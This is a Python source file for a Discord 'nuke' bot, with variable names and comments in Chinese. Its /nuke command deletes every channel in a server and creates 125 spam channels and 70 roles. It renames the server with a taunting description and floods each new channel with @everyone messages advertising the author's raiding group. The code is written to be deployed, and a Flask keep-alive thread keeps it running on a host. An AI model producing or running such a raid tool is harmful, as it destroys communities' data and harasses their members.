import discord
import os
import asyncio
from flask import Flask
import threading

intents = discord.Intents.default()
intents.guilds = True

class MyBot(discord.Client):
    def __init__(self):
        super().__init__(intents=intents)
        self.tree = discord.app_commands.CommandTree(self)
    async def setup_hook(self):
        pass

bot = MyBot()

@bot.tree.command(name="nuke", description="boom the server")
async def clear(interaction: discord.Interaction):
    要建几个频道 = 125
    每个频道发几条 = 45  
    要发的信息 = "# @everyone 想要娱乐机器人跟炸群机器人吗，那就加入阿均的总部吧 https://discord.gg/zAkEF6cghx"
    新频道名字 = "下去吧孩子!!!!!!!"
    统一名字 = "周杰倫"
    要建几个身份组 = 70
    # -----------------

    guild = interaction.guild
    await interaction.response.defer(ephemeral=True)

    # 1. 删
    all_ch = list(guild.channels)
    all_ch.sort(key=lambda x: isinstance(x, discord.CategoryChannel))
    for ch in all_ch:
        try:
            await ch.delete()
            await asyncio.sleep(0.1)
        except: continue

    # 2. 定义两个任务
    新建的频道 = []

    async def 建频道任务():
        for i in range(要建几个频道):
            try:
                new_ch = await guild.create_text_channel(name=f"{新频道名字}-{i+1}")
                新建的频道.append(new_ch)
            except: 
                pass
            await asyncio.sleep(0.1)

    async def 建身份组任务():
        for i in range(要建几个身份组):
            try:
                await guild.create_role(name=f"{统一名字}-{i+1}")
            except:
                pass
            await asyncio.sleep(0.2)

    async def 服务器名():
        await guild.edit(name="阿均的欢乐大部队之炸群快乐小伙伴")
    
    async def 服务器简介():
        await guild.edit(description="这是阿均的快乐伙伴炸群机器人，你的群已经被我们炸了hahahaha，受着吧")

    # 3. 同时一起建，两个一起跑
    await asyncio.gather(
        建频道任务(),
        建身份组任务(),
        服务器名(),
        服务器简介()
    )

    # 4. 建完后再一起刷
    async def 炸一个频道(ch):
        for _ in range(每个频道发几条):
            try:
                await ch.send(要发的信息)
                await asyncio.sleep(0.55)
            except:
                await asyncio.sleep(6)

    await asyncio.gather(*[炸一个频道(ch) for ch in 新建的频道])

@bot.event
async def on_ready():
    print(f"✅ 已上线 {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"同步了 {len(synced)} 个 / 指令")
    except Exception as e:
        print(f"同步失败: {e}")

app = Flask(name)
@app.route('/')
def home(): return "ok"
threading.Thread(target=lambda: app.run(host='0.0.0.0', port=10000), daemon=True).start()

bot.run(os.getenv("DISCORD_TOKEN"))



